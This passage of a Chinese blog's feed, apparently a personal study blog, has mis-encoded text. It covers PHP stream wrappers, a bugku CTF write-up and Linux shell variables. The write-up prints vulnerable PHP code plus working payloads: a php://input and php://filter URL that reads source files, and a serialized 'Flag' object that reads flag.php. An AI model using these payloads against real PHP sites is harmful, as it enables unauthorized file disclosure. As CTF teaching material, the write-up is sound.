<h3 id="6-çº¿ç¨‹çš„ä¼˜å…ˆçº§"><a href="#6-çº¿ç¨‹çš„ä¼˜å…ˆçº§" class="headerlink" title="6.çº¿ç¨‹çš„ä¼˜å…ˆçº§"></a>6.çº¿ç¨‹çš„ä¼˜å…ˆçº§</h3><p>ç”±äºçº¿ç¨‹éœ€è¦åƒè¿›ç¨‹é‚£æ ·èƒ½å¤Ÿè¢«è°ƒåº¦ï¼Œ<br>é‚£ä¹ˆå°±å¿…é¡»è¦æœ‰å¯ä¾›è°ƒåº¦ä½¿ç”¨çš„å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å°±æ˜¯çº¿ç¨‹çš„ä¼˜å…ˆçº§ã€‚<br><a href="https://blog.csdn.net/shuilan0066/article/details/7683315" target="_blank" rel="noopener">å‚è€ƒCSDN</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä¼ªåè®®åœ¨CTFçš„åº”ç”¨</title>
    <url>/yakko117/2019/07/22/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="PHPä¼ªåè®®-lt-è½¬-gt"><a href="#PHPä¼ªåè®®-lt-è½¬-gt" class="headerlink" title="PHPä¼ªåè®®&lt;è½¬&gt;"></a>PHPä¼ªåè®®&lt;è½¬&gt;</h1><p>PHPæ”¯æŒçš„ä¼ªåè®®å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file: <span class="comment">// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line">http: <span class="comment">// â€” è®¿é—® HTTP(s) ç½‘å€</span></span><br><span class="line">ftp: <span class="comment">// â€” è®¿é—® FTP(s) URLs</span></span><br><span class="line">php: <span class="comment">// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</span></span><br><span class="line">zlib: <span class="comment">// â€” å‹ç¼©æµ</span></span><br><span class="line">data: <span class="comment">// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span></span><br><span class="line">glob: <span class="comment">// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span></span><br><span class="line">phar: <span class="comment">// â€” PHP å½’æ¡£</span></span><br><span class="line">ssh2: <span class="comment">// â€” Secure Shell 2</span></span><br><span class="line">rar: <span class="comment">// â€” RAR</span></span><br><span class="line">ogg: <span class="comment">// â€” éŸ³é¢‘æµ</span></span><br><span class="line">expect: <span class="comment">// â€” å¤„ç†äº¤äº’å¼çš„æµ</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="PHP-ini"><a href="#PHP-ini" class="headerlink" title="PHP.ini"></a>PHP.ini</h2><p>åœ¨<code>php.ini</code>é‡Œæœ‰ä¸¤ä¸ªé‡è¦çš„å‚æ•°<code>allow_url_fopen</code> å’Œ <code>allow_url_include</code></p>
<p><code>allow_url_fopen</code> : é»˜è®¤å€¼æ˜¯ONï¼Œå…è®¸URLé‡Œçš„å°è£…åè®®è®¿é—®æ–‡ä»¶</p>
<p><code>allow_url_include</code> : é»˜è®¤å€¼æ˜¯OFFï¼Œä¸å…è®¸åŒ…å«URLé‡Œçš„å°è£…åè®®åŒ…å«æ–‡ä»¶</p>
<hr>
<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>ç»å¸¸ä½¿ç”¨çš„ä¼ªåè®®ï¼Œä¸€èˆ¬ç”¨äºä»»æ„æ–‡ä»¶è¯»å–ï¼Œæœ‰æ—¶ä¹Ÿå¯ä»¥ç”¨äºgetshell.åœ¨åŒOFFçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨.</p>
<p><code>php://filter</code> æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œç”¨äºæ•°æ®æµæ‰“å¼€æ—¶ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ã€‚ç±»ä¼¼ <code>readfile()ã€file()ã€file_get_contents()</code>ï¼Œåœ¨æ•°æ®æµè¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šä½¿ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</p>
<table>
<thead>
<tr>
<th align="center">åç§°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="center">resource=*&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;*</td>
<td align="left">è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td>
</tr>
<tr>
<td align="center">read=*&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;*</td>
<td align="left">è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦åˆ†éš”</td>
</tr>
<tr>
<td align="center">write=*&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;*</td>
<td align="left">è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼ŒåŒæ ·ä»¥ç®¡é“ç¬¦åˆ†éš”</td>
</tr>
<tr>
<td align="center">&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td>
<td align="left">ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td>
</tr>
</tbody></table>
<hr>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/[read/write]=string.[rot1/strip_tags/â€¦..]/resource=xxx</span></span><br></pre></td></tr></table></figure></div>

<p><code>filter</code> å’Œ <code>string</code> è¿‡æ»¤å™¨è¿ç”¨å¯ä»¥å¯¹å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤ã€‚<code>filter</code> çš„<code>read</code> å’Œ <code>write</code> å‚æ•°æœ‰ä¸åŒçš„åº”ç”¨åœºæ™¯ã€‚<code>read</code>ç”¨äº <code>include()</code>å’Œ <code>file_get_contents()</code>ï¼Œ<code>write</code> ç”¨äº <code>file_put_contents()</code> ä¸­ã€‚</p>
<hr>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-[encode/decode]/resource=xxx</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯ä½¿ç”¨çš„è¿‡æ»¤å™¨æ˜¯ <code>convert.base64-encode</code>.å®ƒçš„ä½œç”¨å°±æ˜¯è¯»å–upload.phpçš„å†…å®¹è¿›è¡Œbase64ç¼–ç åè¾“å‡ºã€‚å¯ä»¥ç”¨äºè¯»å–ç¨‹åºæºä»£ç ç»è¿‡base64ç¼–ç åçš„æ•°æ®</p>
<hr>
<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><code>php://input</code> å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸º <code>php://input</code>ï¼ŒåŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚</p>
<p>éœ€è¦å¼€å¯<code>allow_url_include</code></p>
<p>(PS:å½“<code>enctype=&quot;multipart/form-data&quot;</code>æ—¶ï¼Œ<code>php://input</code>æ˜¯æ— æ•ˆçš„ã€‚)</p>
<hr>
<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><p><code>file://</code> ä¼ªåè®®åœ¨åŒOFFçš„æ—¶å€™ä¹Ÿå¯ä»¥ç”¨ï¼Œç”¨äºæœ¬åœ°æ–‡ä»¶åŒ…å«.</p>
<p>(PS: <code>file://</code> åè®®å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„)</p>
<hr>
<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>PHP å½’æ¡£ï¼Œå¸¸å¸¸è·Ÿæ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶ä¸Šä¼ ç»“åˆç€è€ƒå¯Ÿã€‚è¯´é€šä¿—ç‚¹å°±æ˜¯phpè§£å‹ç¼©åŒ…çš„ä¸€ä¸ªå‡½æ•°ï¼Œè§£å‹çš„å‹ç¼©åŒ…ä¸åç¼€æ— å…³ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">phar:<span class="comment">//test.[zip/jpg/pngâ€¦]/file.txt</span></span><br></pre></td></tr></table></figure></div>
<p>å…¶å®å¯ä»¥å°†ä»»æ„åç¼€åçš„æ–‡ä»¶(å¿…é¡»è¦æœ‰åç¼€å)ï¼Œåªè¦æ˜¯zipæ ¼å¼å‹ç¼©çš„ï¼Œéƒ½å¯ä»¥è¿›è¡Œè§£å‹ï¼Œå› æ­¤ä¸Šé¢å¯ä»¥æ”¹ä¸º<code>phar://test.test/file.txt</code> ä¹Ÿå¯ä»¥è¿è¡Œã€‚</p>
<hr>
<h2 id="zip-bzip2-zlib"><a href="#zip-bzip2-zlib" class="headerlink" title="zip://,bzip2://, zlib://"></a>zip://,bzip2://, zlib://</h2><p>åœ¨åŒOFFçš„æ—¶å€™ä¹Ÿå¯ä»¥ç”¨</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">zip:<span class="comment">//test.zip%23file.txt</span></span><br></pre></td></tr></table></figure></div>
<p>å’Œ <code>phar://</code>ä¸€æ ·ç”¨äºè¯»å–å‹ç¼©æ–‡ä»¶ï¼Œä¸è¿‡å¯¹äº <code>zip://test.zip#file.txt</code> ä¸­çš„<code>#</code>è¦ç¼–ç ä¸º<code>%23</code>.å› ä¸ºurlçš„#åçš„å†…å®¹ä¸ä¼šè¢«ä¼ é€</p>
<hr>
<h1 id="ä¸¾ä¸ªæ —å­å§"><a href="#ä¸¾ä¸ªæ —å­å§" class="headerlink" title="ä¸¾ä¸ªæ —å­å§"></a>ä¸¾ä¸ªæ —å­å§</h1><p>åœ¨æœ¬åœ°å¤ç°äº†bugkuçš„ä¸€é“é¢˜ç›®(å› ä¸ºåŸé¢˜æŒ‚äº†qvq)<br>åŸé¢˜é¢˜ç›®ï¼š<a href="http://120.24.86.145:8006/test1/" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/</a></p>
<p>åœ¨æ‹¿åˆ°é¢˜ç›®å é¦–å…ˆæŸ¥çœ‹æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åˆ†æä¸€ä¸‹æºç </p>
<ol>
<li>getæ–¹å¼ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼š<code>txt</code>ï¼Œ<code>file</code>ï¼Œ<code>password</code></li>
<li><code>file_get_contents()</code>å‡½æ•°çš„ä½œç”¨æ˜¯å°†<code>$user</code>çš„å†…å®¹è¯»å–å‡ºæ¥ï¼Œåœ¨æ­¤å³ä¸ºå°†userè¯»å–å‡ºæ¥çš„å†…å®¹æ•°å€¼ä¸ç±»å‹å…¨ç­‰welcome to the bugkuctfã€‚ï¼ˆ===ï¼‰</li>
<li>å¦‚æœæ»¡è¶³ifæ¡ä»¶ï¼Œåˆ™æ‰“å°è¾“å‡ºâ€hello admin!â€ã€‚å¹¶ä¸”å°†åŒ…å«çš„<code>hint.php</code>å†…å®¹æ˜¾ç¤ºå‡ºæ¥</li>
</ol>
<p>åœ¨æ­¤ï¼Œå¯ä»¥è¿ç”¨ä¸¤ä¸ªPHPçš„ä¼ªåè®®<br>1.<code>php://filter</code> ï¼šå¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶çš„è¯»å–ã€‚<br>æœ‰å…³<code>php://filter</code>çš„è¯¦ç»†äº†è§£ï¼š<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">pç¥çš„è¯¦è§£</a><br>2.<code>php://input</code> ï¼šå¯ä»¥è¯»å–æ²¡æœ‰å¤„ç†è¿‡çš„postæ•°æ®</p>
<p>é€šè¿‡å¯¹ä»¥ä¸Šä»£ç çš„åˆ†æï¼Œæˆ‘ä»¬æœ‰äº†è§£å†³æ€è·¯ï¼š</p>
<p>å¯¹äº<code>file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;</code>ï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿç”¨phpä¼ªåè®®<code>php://input</code>ï¼Œè¦æƒ³ä½¿userä¸­çš„å­—ç¬¦ä¸²è¯»å–å‡ºæ¥ä¸ä¸‰ç­‰å·åçš„å†…å®¹ä¸€è‡´ï¼Œå°±å¿…é¡»ä½¿ä»–çš„ä¼ å…¥å‚æ•°txtï¼Œæ¥post  welcome to the bugkuctf<br>å†æ¥çœ‹<code>include($file); //hint.php</code>ã€‚æˆ‘ä»¬å¯ä»¥ç”¨<code>php://filter</code>æ¥è¿›è¡Œhint.phpçš„baseç¼–ç ï¼Œä»è€Œå¯ä»¥è¯»å–å‡ºhint.phpçš„å†…å®¹ã€‚<br>æ„é€ payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?txt&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hint.php</span><br></pre></td></tr></table></figure></div>

<p>åˆ©ç”¨bpæ”¹åŒ…</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut74i4j317l0a2q5p.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut74i4j317l0a2q5p.jpg" class="lazyload" title="test"></a></p>
<p>å‘ç°ä¸€ç»„base64,å†è¿›è¡Œbase64è§£ç ï¼Œå‘ç°åˆæœ‰ä¸€ç»„ä»£ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>çœ‹åˆ° <code>flag.php</code>ï¼ŒçŒœæµ‹flagæˆ–è®¸å°±ä»è¿™æ®µä»£ç ä¸­æ‰¾å‡ºã€‚<br>å®¡è®¡ä»£ç å‘ç°äº†æ¯”è¾ƒå…³é”®çš„ä¸€ä¸ªå‡½æ•°<code>__tostring()</code>ï¼Œæ­¤å‡½æ•°çš„ä½œç”¨æ˜¯å°†Flagç±»ä½œä¸ºå­—ç¬¦ä¸²æ‰§è¡Œæ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œæ­¤å‡½æ•°ï¼Œå¹¶ä¸”å°†å˜é‡ <code>$file</code> ä½œä¸ºæ–‡ä»¶åè¾“å‡ºæ–‡ä»¶å†…å®¹ã€‚è€Œä¸”ï¼Œè¿˜æœ‰ä¸€ä¸ª <code>password</code> å‚æ•°æ²¡æœ‰ç”¨ä¸Šï¼Œæ‰€ä»¥è€ƒè™‘ï¼Œæˆ–è®¸è¿˜ä¼šå­˜åœ¨å¦ä¸€æ®µä»£ç ã€‚é‚£å°±æ¥ç€ä¸Šä¸€æ­¥ï¼ŒæŠŠhint.phpæ¢æˆindex.phpä¼šæœ‰ä»€ä¹ˆå‘ç°å‘¢ï¼Ÿ<br>å˜¿å˜¿ï¼Œå‘ç°æ–°çš„ç¼–ç </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut9cd6j317g0fbn2a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut9cd6j317g0fbn2a.jpg" class="lazyload" title="test"></a></p>
<p>è§£ç å</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"ä¸èƒ½ç°åœ¨å°±ç»™ä½ flagå“¦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure></div>

<p>ç»“æœå‘ç°äº†æ­£åˆ™åŒ¹é…å‡½æ•°<code>preg_match(&quot;/flag/&quot;,$file)</code>ï¼Œå¯¹flagè¿›è¡Œäº†æ­£åˆ™åŒ¹é…ã€‚<br>å†æ¥æ¥ç€çœ‹ï¼Œelseä»£ç å—ä¸­åˆä¸€æ¬¡åŒ…å«äº†<code>$file</code>ï¼Œå¹¶ä¸”å¯¹<code>$password</code>è¿›è¡Œååºåˆ—åŒ–ã€‚é€šè¿‡å¯¹ä¸Šè¿°hint.phpçš„è§£è¯»ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ passwordï¼Œpasswordä¸ºFlagç±»å‹ï¼Œå­—ç¬¦ä¸²å˜é‡<code>file=flag.php</code>ã€‚<br>æ„é€ çš„åºåˆ—åŒ–å¯¹è±¡payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°flagï¼ˆ=v= å¥½å§ phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼‰</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut6kazj30z30a40uv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut6kazj30z30a40uv.jpg" class="lazyload" title="test"></a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>linux shellä¸‹çš„ç‰¹æ®Šç”¨æ³•åŠå‚æ•°çš„è¯´æ˜</title>
    <url>/yakko117/2019/07/15/linuxshell_study/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="å˜é‡è¯´æ˜"><a href="#å˜é‡è¯´æ˜" class="headerlink" title="å˜é‡è¯´æ˜:"></a>å˜é‡è¯´æ˜:</h1><h2 id><a href="#" class="headerlink" title="$$"></a>$$</h2><p>Shell æœ¬èº«çš„PIDï¼ˆProcessIDï¼‰</p>
<h2 id="-1"><a href="#-1" class="headerlink" title="$!"></a>$!</h2><p>Shell æœ€åè¿è¡Œçš„åå°Processçš„PID </p>
<h2 id="-2"><a href="#-2" class="headerlink" title="$?"></a>$?</h2><p>æœ€åè¿è¡Œçš„å‘½ä»¤çš„ç»“æŸä»£ç ï¼ˆè¿”å›å€¼ï¼‰ </p>
<h2 id="-3"><a href="#-3" class="headerlink" title="$-"></a>$-</h2><p>ä½¿ç”¨Setå‘½ä»¤è®¾å®šçš„Flagä¸€è§ˆ </p>
<h2 id="-4"><a href="#-4" class="headerlink" title="$*"></a>$*</h2><p>æ‰€æœ‰å‚æ•°åˆ—è¡¨ã€‚å¦‚ <code>$*</code> ç”¨<code>[&quot;]</code>æ‹¬èµ·æ¥çš„æƒ…å†µï¼Œä»¥ <code>&quot;$1 $2 â€¦ $n&quot;</code> çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚ </p>
<h2 id="-5"><a href="#-5" class="headerlink" title="$@"></a>$@</h2><p>æ‰€æœ‰å‚æ•°åˆ—è¡¨ã€‚å¦‚ <code>$@</code> ç”¨<code>[&quot;]</code>æ‹¬èµ·æ¥çš„æƒ…å†µï¼Œä»¥ <code>&quot;$1&quot;</code> <code>&quot;$2&quot;</code> â€¦ <code>&quot;$n&quot;</code> çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚</p>
<hr>
<h2 id="-6"><a href="#-6" class="headerlink" title="$#"></a><code>$#</code></h2><p>æ·»åŠ åˆ°Shellçš„å‚æ•°ä¸ªæ•° </p>
<h2 id="0"><a href="#0" class="headerlink" title="$0"></a>$0</h2><p>Shellæœ¬èº«çš„æ–‡ä»¶å </p>
<h2 id="ä»¥åŠ-1-n"><a href="#ä»¥åŠ-1-n" class="headerlink" title="ä»¥åŠ $1 $n"></a>ä»¥åŠ <code>$1</code> <code>$n</code></h2><p>æ·»åŠ åˆ°Shellçš„å„å‚æ•°å€¼ã€‚<code>$1</code>æ˜¯ç¬¬1å‚æ•°ï¼Œ<code>$2</code>æ˜¯ç¬¬2å‚æ•°</p>
<hr>
<h1 id="ä¸¾ä¸ªä¾‹å­"><a href="#ä¸¾ä¸ªä¾‹å­" class="headerlink" title="ä¸¾ä¸ªä¾‹å­"></a>ä¸¾ä¸ªä¾‹å­</h1><p>å†™ä¸ªç®€å•çš„ä¾‹å­ï¼Œæ‰§è¡Œä»¥åå†æ¥è§£é‡Šå„ä¸ªå˜é‡çš„æ„ä¹‰</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leafpad yakko_test</span><br></pre></td></tr></table></figure></div>

<p>è„šæœ¬å†…å®¹å¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh </span></span><br><span class="line">echo "number:$#" </span><br><span class="line">echo "scname:$0" </span><br><span class="line">echo "first :$1" </span><br><span class="line">echo "second:$2" </span><br><span class="line">echo "argume:$@"</span><br></pre></td></tr></table></figure></div>

<p>ä¿å­˜é€€å‡ºï¼Œèµ‹äºˆæƒé™</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x yakko_test</span><br><span class="line"></span><br><span class="line">// æ‰§è¡Œè„šæœ¬</span><br><span class="line">./yakko_test aa bb </span><br><span class="line"></span><br><span class="line">// å›æ˜¾å¾—åˆ°</span><br><span class="line">number:2 </span><br><span class="line">scname:./yakko_test</span><br><span class="line">first: aa </span><br><span class="line">second:bb </span><br><span class="line">argume:aa bb</span><br></pre></td></tr></table></figure></div>
<p>é€šè¿‡æ˜¾ç¤ºç»“æœå¯ä»¥çœ‹åˆ°ï¼š<br><code>$#</code> æ˜¯ä¼ ç»™è„šæœ¬çš„å‚æ•°ä¸ªæ•°<br><code>$0</code> æ˜¯è„šæœ¬æœ¬èº«çš„åå­—<br><code>$1</code> æ˜¯ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°<br><code>$2</code> æ˜¯ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬äºŒä¸ªå‚æ•°<br><code>$@</code> æ˜¯ä¼ ç»™è„šæœ¬çš„æ‰€æœ‰å‚æ•°çš„åˆ—è¡¨</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode Pythonå­¦ä¹ ç¬”è®°(ä¸€)</title>
    <url>/yakko117/2019/07/11/leetcode1/</url>
